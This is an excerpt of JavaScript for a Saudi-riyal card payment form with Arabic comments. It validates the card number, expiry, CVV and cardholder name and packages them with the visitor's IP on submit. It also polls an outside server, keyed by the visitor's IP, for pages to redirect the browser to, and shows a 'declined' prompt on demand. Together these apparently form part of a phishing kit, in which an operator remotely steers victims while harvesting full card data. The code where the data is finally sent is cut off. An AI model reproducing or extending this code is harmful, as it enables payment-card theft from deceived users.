...
$(document).ready(function() {
    ...
    (async () => {
        try {
            ...
            // فحص إذا كان هناك انتقال معلق أو رفض في الرابط
            const params = new URLSearchParams(window.location.search);
            if (params.get("declined") === "true") {
                showDeclineModal();
            }

            // التحقق من الانتقالات المعلقة من السيرفر
            const res = await fetch(`https://dallah-server-xpls.onrender.com/api/pending-nav/${encodeURIComponent(ip)}`);
            const navData = await res.json();
            if (navData.page && !window.location.href.includes(navData.page)) {
                window.location.href = navData.page;
            }
    ...
    // تنسيق رقم البطاقة - إضافة مسافة كل 4 أرقام (16 رقم فقط)
    $("#cardNumberI").on("input", function() {
        let value = $(this).val().replace(/\s+/g, '').replace(/[^\d]/g, '');
        
        // تقييد على 16 رقم فقط
        if (value.length > 16) {
    ...
    function validateCardNumber() {
        const cardNumber = $("#cardNumberI").val().replace(/\s+/g, '');
        const cardError = $("#cardError");
        const cardInput = $("#cardNumberI");
        
        if (cardNumber.length === 0) {
            cardError.removeClass("show");
            cardInput.removeClass("is-invalid");
            return true;
        }
        
        if (cardNumber.length < 16 || !luhnCheck(cardNumber)) {
            cardError.addClass("show");
    ...
    function validateExpiry() {
        ...
        const expiryError = $("#expiryError");
        const expiryInput = $("#expiry");
        
        if (expiry.length === 0) {
            expiryError.removeClass("show");
            expiryInput.removeClass("is-invalid");
            return true;
        }
        
        if (expiry.length < 5 || !isValidExpiryDate(expiry)) {
            expiryError.addClass("show");
    ...
    function validateCVV() {
        ...
        const cvvInput = $("input[name='cvv']");
        
        if (cvv.length === 0) {
            cvvError.removeClass("show");
            cvvInput.removeClass("is-invalid");
            return true;
        }
        
        if (cvv.length !== 3) {
            cvvError.addClass("show");
    ...
    function validateName() {
        const name = $("input[name='cardName']").val().trim();
        const nameError = $("#nameError");
        const nameInput = $("input[name='cardName']");
    ...
    $("#paymentForm").on("submit", function(e) {
        ...
        const data = {
            ip: window.visitorIP,
            total: selectedAmount + " ريال سعودي",
